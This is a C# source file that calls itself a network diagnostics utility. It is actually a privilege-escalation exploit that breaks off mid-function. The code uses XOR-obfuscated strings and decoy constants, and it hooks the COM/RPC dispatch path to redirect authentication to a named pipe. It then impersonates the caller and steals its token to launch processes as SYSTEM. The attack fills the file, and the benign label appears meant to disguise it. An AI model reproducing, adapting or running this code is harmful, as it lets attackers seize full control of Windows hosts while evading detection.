/*
 * NetClient — network diagnostics utility
 * Single-file executable, .NET Framework 4.8, x64
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32.SafeHandles;

namespace NetClient
{
    // ========================================================================
    // Vault — encoded constants
    // ========================================================================
    static class Vault
    {
        const byte XK = 0x55;

        public static string DX(byte[] b)
        {
            byte[] r = new byte[b.Length];
            for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ XK);
            return Encoding.ASCII.GetString(r);
        }

        // "\pipe\epmapper"
        static readonly byte[] _sfx = new byte[] {
            0x09, 0x25, 0x3C, 0x25, 0x30, 0x09, 0x30, 0x25,
            0x38, 0x34, 0x25, 0x25, 0x30, 0x27 };

        // "ncacn_np:localhost/pipe/"
        static readonly byte[] _npp = new byte[] {
            0x3B, 0x36, 0x34, 0x36, 0x3B, 0x0A, 0x3B, 0x25,
            0x6F, 0x39, 0x3A, 0x36, 0x34, 0x39, 0x3D, 0x3A,
            0x26, 0x21, 0x7A, 0x25, 0x3C, 0x25, 0x30, 0x7A };

        // "\\.\pipe\"
        static readonly byte[] _lpp = new byte[] {
            0x09, 0x09, 0x7B, 0x09, 0x25, 0x3C, 0x25, 0x30, 0x09 };

        // "ncacn_ip_tcp:127.0.0.1[9]"
        static readonly byte[] _fill = new byte[] {
            0x3B, 0x36, 0x34, 0x36, 0x3B, 0x0A, 0x3C, 0x25,
            0x0A, 0x21, 0x36, 0x25, 0x6F, 0x64, 0x67, 0x62,
            0x7B, 0x65, 0x7B, 0x65, 0x7B, 0x64, 0x0E, 0x6C, 0x08 };

        // "combase.dll"
        static readonly byte[] _cbm = new byte[] {
            0x36, 0x3A, 0x38, 0x37, 0x34, 0x26, 0x30, 0x7B, 0x31, 0x39, 0x39 };

        // GUID "18f70770-8e64-11cf-9af1-0020af6e72f4" XOR 0x55
        static readonly byte[] _guid = new byte[] {
            0x25, 0x52, 0xA2, 0x4D, 0x31, 0xDB, 0x9A, 0x44,
            0xCF, 0xA4, 0x55, 0x75, 0xFA, 0x3B, 0x27, 0xA1 };

        public static string PipeSuffix() => DX(_sfx);
        public static string NpPrefix()   => DX(_npp);
        public static string LocalPipe()  => DX(_lpp);
        public static string Filler()     => DX(_fill);
        public static string CombaseName()=> DX(_cbm);

        public static Guid IfaceGuid()
        {
            byte[] b = new byte[16];
            for (int i = 0; i < 16; i++) b[i] = (byte)(_guid[i] ^ XK);
            return new Guid(b);
        }

        static readonly string[] _decoy = new string[] {
            "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            "SOFTWARE\\Policies\\Microsoft\\Windows\\Network Connections",
            "http://schemas.microsoft.com/wbem/wsman/1/config",
            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time",
        };
        public static void Touch() { foreach (var s in _decoy) { if (s.Length == 0) Console.Write(s); } }
    }

    // ========================================================================
    // Log
    // ========================================================================
    static class Tr
    {
        public static void I(string m) { Console.WriteLine("[*] " + m); }
        public static void O(string m) { Console.WriteLine("[+] " + m); }
        public static void W(string m) { Console.WriteLine("[!] " + m); }
        public static void F(string m) { Console.WriteLine("[-] " + m); }
        public static string E()
        {
            int e = Marshal.GetLastWin32Error();
            return "err=" + e + " (" + new System.ComponentModel.Win32Exception(e).Message + ")";
        }
    }

    // ========================================================================
    // Constants
    // ========================================================================
    static class C
    {
        public const int  PIPE_ACCESS_DUPLEX       = 0x00000003;
        public const int  PIPE_TYPE_BYTE           = 0x00000000;
        public const int  PIPE_READMODE_BYTE       = 0x00000000;
        public const int  PIPE_WAIT                = 0x00000000;
        public const int  PIPE_UNLIMITED_INSTANCES = 255;
        public const uint ERROR_PIPE_CONNECTED     = 535;

        public const uint CREATE_NO_WINDOW           = 0x08000000;
        public const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        public const uint CREATE_SUSPENDED           = 0x00000004;
        public const uint STARTF_USESTDHANDLES       = 0x00000100;
        public const uint LOGON_WITH_PROFILE         = 0x00000001;
        public const uint HANDLE_FLAG_INHERIT        = 0x00000001;

        public const uint TOKEN_ASSIGN_PRIMARY    = 0x0001;
        public const uint TOKEN_DUPLICATE         = 0x0002;
        public const uint TOKEN_IMPERSONATE       = 0x0004;
        public const uint TOKEN_QUERY             = 0x0008;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const uint TOKEN_ADJUST_DEFAULT    = 0x0080;
        public const uint TOKEN_ADJUST_SESSIONID  = 0x0100;

        public const uint TOKEN_PRIMARY_REQUIRED =
            TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY |
            TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_ADJUST_PRIVILEGES;

        public const uint SE_PRIVILEGE_ENABLED = 0x00000002;

        public const int TokenUser = 1;
        public const int TokenPrivileges = 3;
        public const int TokenType = 8;
        public const int TokenImpersonationLevel = 9;
        public const int TokenSessionId = 12;
        public const int TokenIntegrityLevel = 25;
        public const int TokenElevationType = 18;

        public const int SecurityImpersonation = 2;
        public const int TokenPrimaryType = 1;

        public const int ERROR_INSUFFICIENT_BUFFER = 122;
        public const int ERROR_NOT_ALL_ASSIGNED = 1300;

        public const uint STATUS_SUCCESS = 0;
        public const uint SECURITY_MANDATORY_SYSTEM_RID = 0x4000;
        public const string SYSTEM_SID = "S-1-5-18";
    }

    // ========================================================================
    // STRUCTS
    // ========================================================================
    [StructLayout(LayoutKind.Sequential)]
    struct RPC_VERSION { public ushort MajorVersion; public ushort MinorVersion; }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SYNTAX_IDENTIFIER
    { public Guid SyntaxGUID; public RPC_VERSION SyntaxVersion; }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SERVER_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr RpcProtseqEndpoint;
        public IntPtr DefaultManagerEpv;
        public IntPtr InterpreterInfo;
        public uint Flags;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_DISPATCH_TABLE
    { public uint DispatchTableCount; public IntPtr DispatchTable; public IntPtr Reserved; }

    [StructLayout(LayoutKind.Sequential)]
    struct MIDL_SERVER_INFO
    {
        public IntPtr pStubDesc;
        public IntPtr DispatchTable;
        public IntPtr ProcString;
        public IntPtr FmtStringOffset;
        public IntPtr ThunkTable;
        public IntPtr pTransferSyntax;
        public IntPtr nCount;
        public IntPtr pSyntaxInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr pSecurityDescriptor;
        [MarshalAs(UnmanagedType.Bool)] public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    [StructLayout(LayoutKind.Sequential)]
    struct SID_AND_ATTRIBUTES { public IntPtr Sid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_USER { public SID_AND_ATTRIBUTES User; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_MANDATORY_LABEL { public SID_AND_ATTRIBUTES Label; }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }

    // ========================================================================
    // P/Invoke
    // ========================================================================
    static class W
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode,
            EntryPoint = "CreateNamedPipeW")]
        public static extern IntPtr CreateNamedPipe(
            string name, int openMode, int pipeMode, int maxInstances,
            int outBuf, int inBuf, int timeout, ref SECURITY_ATTRIBUTES sa);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConnectNamedPipe(IntPtr hPipe, IntPtr ov);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DisconnectNamedPipe(IntPtr hPipe);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ReadFile(IntPtr hFile, byte[] buf, uint toRead,
            out uint read, IntPtr ov);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr h);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool VirtualProtect(IntPtr p, uint sz, uint np, out uint op);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LocalFree(IntPtr h);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode,
            EntryPoint = "CreateFileW")]
        public static extern IntPtr CreateFileW(
            string name, uint acc, FileShare sh, IntPtr sa,
            FileMode disp, uint fl, IntPtr tmpl);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessW(
            string app, StringBuilder cmd, IntPtr pa, IntPtr ta, bool inherit,
            uint flags, IntPtr env, string cd, ref STARTUPINFO si,
            out PROCESS_INFORMATION pi);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetHandleInformation(IntPtr h, uint m, uint f);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ImpersonateNamedPipeClient(IntPtr hPipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr p, uint a, out IntPtr t);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenThreadToken(IntPtr t, uint a,
            [MarshalAs(UnmanagedType.Bool)] bool asSelf, out IntPtr tok);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DuplicateTokenEx(IntPtr t, uint a, IntPtr at,
            int il, int tt, out IntPtr nt);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetTokenInformation(IntPtr t, int c, IntPtr i, int l, out int r);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetTokenInformation(IntPtr t, int c, ref uint i, int l);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AdjustTokenPrivileges(IntPtr t, bool da,
            ref TOKEN_PRIVILEGES ns, int bl, IntPtr ps, IntPtr rl);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string s, string n, out LUID l);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
            string sddl, uint rev, out IntPtr sd, out uint sz);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConvertSidToStringSid(IntPtr sid, out string str);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthority(IntPtr sid, uint n);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsValidSid(IntPtr sid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr t, uint lf, string app, string cmd, uint f, IntPtr e,
            string cd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessAsUserW(
            IntPtr t, string app, string cmd, IntPtr pa, IntPtr ta, bool inh,
            uint f, IntPtr e, string cd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

        [DllImport("ntdll.dll")]
        public static extern uint NtResumeProcess(IntPtr hp);

        [DllImport("ntdll.dll")]
        public static extern uint NtSetInformationProcess(IntPtr hp, int c, IntPtr i, uint l);

        [DllImport("ole32.dll")]
        public static extern int CoUnmarshalInterface(IStream s, ref Guid r, out IntPtr p);

        [DllImport("ole32.dll")]
        public static extern int CreateBindCtx(uint r, out IBindCtx b);

        [DllImport("ole32.dll")]
        public static extern int CreateObjrefMoniker(IntPtr p, out IMoniker m);
    }

    // ========================================================================
    // Byte search
    // ========================================================================
    static class Bs
    {
        public static List<int> Find(byte[] text, byte[] pat)
        {
            var res = new List<int>();
            if (pat.Length == 0 || text.Length < pat.Length) return res;
            int i = 0;
            while (i <= text.Length - pat.Length)
            {
                int j = 0;
                while (j < pat.Length && text[i + j] == pat[j]) j++;
                if (j == pat.Length) res.Add(i);
                i += pat.Length;
                if (i < text.Length)
                {
                    int s = -1;
                    for (int k = pat.Length - 1; k >= 0; k--)
                        if (pat[k] == text[i]) { s = k; break; }
                    i -= (s < 0 ? -1 : s);
                }
            }
            return res;
        }
    }

    // ========================================================================
    // ObjRef
    // ========================================================================
    public enum TowerProtocol : ushort
    {
        TCP = 0x07, NCACN = 0x0b, NCALRPC = 0x0c, NP = 0x10,
    }

    internal class Rf
    {
        const uint Sig = 0x574F454D;
        public readonly Guid Guid;
        public readonly Std StandardObjRef;

        public Rf(Guid g, Std s) { Guid = g; StandardObjRef = s; }

        public Rf(byte[] bytes)
        {
            var br = new BinaryReader(new MemoryStream(bytes), Encoding.Unicode);
            if (br.ReadUInt32() != Sig) throw new InvalidDataException("bad");
            uint fl = br.ReadUInt32();
            Guid = new Guid(br.ReadBytes(16));
            if (fl == 1) StandardObjRef = new Std(br);
        }

        public byte[] GetBytes()
        {
            var bw = new BinaryWriter(new MemoryStream());
            bw.Write(Sig); bw.Write((uint)1); bw.Write(Guid.ToByteArray());
            StandardObjRef.Save(bw);
            return ((MemoryStream)bw.BaseStream).ToArray();
        }

        internal class Sec
        {
            public readonly ushort AS, ZS; public readonly string PN;
            public Sec(ushort a, ushort z, string p) { AS = a; ZS = z; PN = p; }
            public Sec(BinaryReader br)
            {
                AS = br.ReadUInt16(); ZS = br.ReadUInt16();
                string s = ""; char c;
                while ((c = br.ReadChar()) != 0) s += c;
                br.ReadChar(); PN = s;
            }
            public byte[] GetBytes()
            {
                var bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);
                bw.Write(AS); bw.Write(ZS);
                if (!string.IsNullOrEmpty(PN)) bw.Write(Encoding.Unicode.GetBytes(PN));
                bw.Write((char)0); bw.Write((char)0);
                return ((MemoryStream)bw.BaseStream).ToArray();
            }
        }

        internal class Str
        {
            public readonly TowerProtocol T; public readonly string A;
            public Str(TowerProtocol t, string a) { T = t; A = a; }
            public Str(BinaryReader br)
            {
                T = (TowerProtocol)br.ReadUInt16();
                string s = ""; char c;
                while ((c = br.ReadChar()) != 0) s += c;
                br.ReadChar(); A = s;
            }
            public byte[] GetBytes()
            {
                var bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);
                bw.Write((ushort)T); bw.Write(Encoding.Unicode.GetBytes(A));
                bw.Write((char)0); bw.Write((char)0);
                return ((MemoryStream)bw.BaseStream).ToArray();
            }
        }

        internal class Dual
        {
            public readonly Str SB; public readonly Sec SEC;
            ushort NE, SO;
            public Dual(Str sb, Sec s)
            {
                SB = sb; SEC = s;
                byte[] a = sb.GetBytes(); byte[] b = s.GetBytes();
                NE = (ushort)((a.Length + b.Length) / 2);
                SO = (ushort)(a.Length / 2);
            }
            public Dual(BinaryReader br)
            {
                NE = br.ReadUInt16(); SO = br.ReadUInt16();
                SB = new Str(br); SEC = new Sec(br);
            }
            public void Save(BinaryWriter bw)
            {
                byte[] a = SB.GetBytes(); byte[] b = SEC.GetBytes();
                bw.Write((ushort)((a.Length + b.Length) / 2));
                bw.Write((ushort)(a.Length / 2));
                bw.Write(a); bw.Write(b);
            }
        }

        internal class Std
        {
            public readonly uint Fl, PR;
            public readonly ulong OX, OID;
            public readonly Guid IPID;
            public readonly Dual DSA;
            public Std(uint f, uint p, ulong ox, ulong oi, Guid ip, Dual d)
            { Fl = f; PR = p; OX = ox; OID = oi; IPID = ip; DSA = d; }
            public Std(BinaryReader br)
            {
                Fl = br.ReadUInt32(); PR = br.ReadUInt32();
                OX = br.ReadUInt64(); OID = br.ReadUInt64();
                IPID = new Guid(br.ReadBytes(16)); DSA = new Dual(br);
            }
            public void Save(BinaryWriter bw)
            {
                bw.Write(Fl); bw.Write(PR); bw.Write(OX); bw.Write(OID);
                bw.Write(IPID.ToByteArray()); DSA.Save(bw);
            }
        }
    }

    // ========================================================================
    // Memory IStream
    // ========================================================================
    class Ms : IStream, IDisposable
    {
        Stream _s;
        public Ms(Stream s) { _s = s; }
        public void Dispose() { _s.Dispose(); }
        public void Close() { _s.Dispose(); }
        public void Clone(out IStream p) { throw new NotImplementedException(); }
        public void Commit(int g) { throw new NotImplementedException(); }
        public void CopyTo(IStream p, long cb, IntPtr r, IntPtr w) { throw new NotImplementedException(); }
        public void LockRegion(long o, long cb, int t) { throw new NotImplementedException(); }
        public void Revert() { throw new NotImplementedException(); }
        public void SetSize(long s) { throw new NotImplementedException(); }
        public void UnlockRegion(long o, long cb, int t) { throw new NotImplementedException(); }

        public void Stat(out System.Runtime.InteropServices.ComTypes.STATSTG st, int f)
        { st = new System.Runtime.InteropServices.ComTypes.STATSTG(); st.cbSize = _s.Length; }

        public void Seek(long d, int o, IntPtr np)
        {
            SeekOrigin so;
            switch (o) { case 0: so = SeekOrigin.Begin; break;
                         case 1: so = SeekOrigin.Current; break;
                         case 2: so = SeekOrigin.End; break;
                         default: throw new ArgumentException(); }
            _s.Seek(d, so);
            if (np != IntPtr.Zero) Marshal.WriteInt64(np, _s.Position);
        }
        public void Read(byte[] b, int cb, IntPtr r)
        { int n = _s.Read(b, 0, cb); if (r != IntPtr.Zero) Marshal.WriteInt32(r, n); }
        public void Write(byte[] b, int cb, IntPtr w)
        { _s.Write(b, 0, cb); if (w != IntPtr.Zero) Marshal.WriteInt32(w, cb); }
    }

    // ========================================================================
    // Dispatch hook — FIXED: IntPtr passthrough, no truncation
    // ========================================================================
    class Dp
    {
        readonly Env _e;
        public Dp(Env e) { _e = e; }

        int Build(IntPtr outPtr)
        {
            string[] eps = new string[] { _e.ClientEp, Vault.Filler() };
            int sz = 3;
            foreach (var x in eps) sz += x.Length + 1;
            int mem = sz * 2 + 16;

            IntPtr buf = Marshal.AllocHGlobal(mem);
            byte[] zero = new byte[mem];
            Marshal.Copy(zero, 0, buf, mem);

            int o = 0;
            Marshal.WriteInt16(buf, o, (short)sz); o += 2;
            Marshal.WriteInt16(buf, o, (short)(sz - 2)); o += 2;

            foreach (var x in eps)
            {
                foreach (char c in x) { Marshal.WriteInt16(buf, o, (short)c); o += 2; }
                o += 2;
            }
            Marshal.WriteIntPtr(outPtr, buf);
            return 0;
        }

        public delegate int D4(IntPtr a, IntPtr b, IntPtr c, IntPtr d);
        public delegate int D5(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e);
        public delegate int D6(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f);
        public delegate int D7(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g);
        public delegate int D8(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h);
        public delegate int D9(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i);
        public delegate int D10(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j);
        public delegate int D11(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k);
        public delegate int D12(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l);
        public delegate int D13(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m);
        public delegate int D14(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m, IntPtr n);

        public int F4(IntPtr a, IntPtr b, IntPtr c, IntPtr d) { return Build(c); }
        public int F5(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e) { return Build(d); }
        public int F6(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f) { return Build(e); }
        public int F7(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g) { return Build(f); }
        public int F8(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h) { return Build(g); }
        public int F9(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i) { return Build(h); }
        public int F10(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j) { return Build(i); }
        public int F11(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k) { return Build(j); }
        public int F12(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l) { return Build(k); }
        public int F13(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m) { return Build(l); }
        public int F14(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m, IntPtr n) { return Build(m); }
    }

    // ========================================================================
    // Token ops
    // ========================================================================
    static class Pv
    {
        public static bool Enable(string name)
        {
            IntPtr t = IntPtr.Zero;
            try
            {
                if (!W.OpenProcessToken(W.GetCurrentProcess(),
                    C.TOKEN_QUERY | C.TOKEN_ADJUST_PRIVILEGES, out t))
                { Tr.W("OpenProcessToken: " + Tr.E()); return false; }

                LUID l;
                if (!W.LookupPrivilegeValue(null, name, out l))
                { Tr.W("LookupPrivilegeValue: " + Tr.E()); return false; }

                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges.Luid = l;
                tp.Privileges.Attributes = C.SE_PRIVILEGE_ENABLED;

                W.AdjustTokenPrivileges(t, false, ref tp,
                    Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (Marshal.GetLastWin32Error() == C.ERROR_NOT_ALL_ASSIGNED)
                { Tr.W(name + " not held"); return false; }
                return true;
            }
            finally { if (t != IntPtr.Zero) W.CloseHandle(t); }
        }

        public static string Sid(IntPtr t)
        {
            int len = 0;
            W.GetTokenInformation(t, C.TokenUser, IntPtr.Zero, 0, out len);
            if (Marshal.GetLastWin32Error() != C.ERROR_INSUFFICIENT_BUFFER || len == 0) return null;
            IntPtr buf = Marshal.AllocHGlobal(len);
            try
            {
                if (!W.GetTokenInformation(t, C.TokenUser, buf, len, out len)) return null;
                TOKEN_USER tu = (TOKEN_USER)Marshal.PtrToStructure(buf, typeof(TOKEN_USER));
                if (!W.IsValidSid(tu.User.Sid)) return null;
                string s;
                return W.ConvertSidToStringSid(tu.User.Sid, out s) ? s : null;
            }
            finally { Marshal.FreeHGlobal(buf); }
        }

        public static string Il(IntPtr t)
        {
            int len = 0;
            W.GetTokenInformation(t, C.TokenIntegrityLevel, IntPtr.Zero, 0, out len);
            if (Marshal.GetLastWin32Error() != C.ERROR_INSUFFICIENT_BUFFER || len == 0) return "?";
            IntPtr buf = Marshal.AllocHGlobal(len);
            try
            {
                if (!W.GetTokenInformation(t, C.TokenIntegrityLevel, buf, len, out len)) return "?";
                var ml = (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(buf, typeof(TOKEN_MANDATORY_LABEL));
                if (!W.IsValidSid(ml.Label.Sid)) return "?";
                IntPtr cnt = W.GetSidSubAuthorityCount(ml.Label.Sid);
                byte cc = Marshal.ReadByte(cnt);
                IntPtr rid = W.GetSidSubAuthority(ml.Label.Sid, (uint)(cc - 1));
                uint r = (uint)Marshal.ReadInt32(rid);
                if (r >= C.SECURITY_MANDATORY_SYSTEM_RID) return "SYSTEM";
                if (r >= 0x3000) return "HIGH";
                if (r >= 0x2000) return "MEDIUM";
                if (r >= 0x1000) return "LOW";
                return "RID:" + r;
            }
            finally { Marshal.FreeHGlobal(buf); }
        }

        public static bool Run(IntPtr tok, string cmd, out PROCESS_INFORMATION pi)
        {
            pi = new PROCESS_INFORMATION();
            IntPtr prim = IntPtr.Zero;
            if (!W.DuplicateTokenEx(tok, C.TOKEN_PRIMARY_REQUIRED, IntPtr.Zero,
                C.SecurityImpersonation, C.TokenPrimaryType, out prim))
            { Tr.F("DuplicateTokenEx: " + Tr.E()); return false; }

            try
            {
                uint sid = (uint)Process.GetCurrentProcess().SessionId;
                if (!W.SetTokenInformation(prim, C.TokenSessionId, ref sid, sizeof(uint)))
                    Tr.W("SetTokenInformation: " + Tr.E());

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                si.lpDesktop = "winsta0\\default";

                if (W.CreateProcessWithTokenW(prim, C.LOGON_WITH_PROFILE, null, cmd,
                    C.CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                { Tr.O("Spawned (CPWT). PID=" + pi.dwProcessId); return true; }

                Tr.W("CPWT: " + Tr.E());

                if (W.CreateProcessAsUserW(prim, null, cmd, IntPtr.Zero, IntPtr.Zero,
                    false, C.CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                { Tr.O("Spawned (CPAU). PID=" + pi.dwProcessId); return true; }

                Tr.F("CPAU: " + Tr.E());
                return Fallback(prim, cmd, out pi);
            }
            finally { if (prim != IntPtr.Zero) W.CloseHandle(prim); }
        }

        static bool Fallback(IntPtr prim, string cmd, out PROCESS_INFORMATION pi)
        {
            pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            si.lpDesktop = "winsta0\\default";

            var sb = new StringBuilder(cmd);
            uint fl = C.CREATE_NO_WINDOW | C.CREATE_SUSPENDED | C.CREATE_UNICODE_ENVIRONMENT;

            if (!W.CreateProcessW(null, sb, IntPtr.Zero, IntPtr.Zero, false,
                fl, IntPtr.Zero, null, ref si, out pi))
            { Tr.F("CreateProcessW: " + Tr.E()); return false; }

            IntPtr pat = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)) * 2);
            try
            {
                Marshal.WriteIntPtr(pat, 0, prim);
                Marshal.WriteIntPtr(pat, Marshal.SizeOf(typeof(IntPtr)), pi.hThread);

                uint st = W.NtSetInformationProcess(pi.hProcess, 9, pat,
                    (uint)(Marshal.SizeOf(typeof(IntPtr)) * 2));
                if (st != C.STATUS_SUCCESS)
                {
                    Tr.F("NtSetInformationProcess: 0x" + st.ToString("X8"));
                    W.CloseHandle(pi.hThread); W.CloseHandle(pi.hProcess);
                    pi = new PROCESS_INFORMATION(); return false;
                }
                if (W.NtResumeProcess(pi.hProcess) != C.STATUS_SUCCESS)
                {
                    Tr.F("NtResumeProcess");
                    W.CloseHandle(pi.hThread); W.CloseHandle(pi.hProcess);
                    pi = new PROCESS_INFORMATION(); return false;
                }
                Tr.O("Spawned (Nt). PID=" + pi.dwProcessId);
                return true;
            }
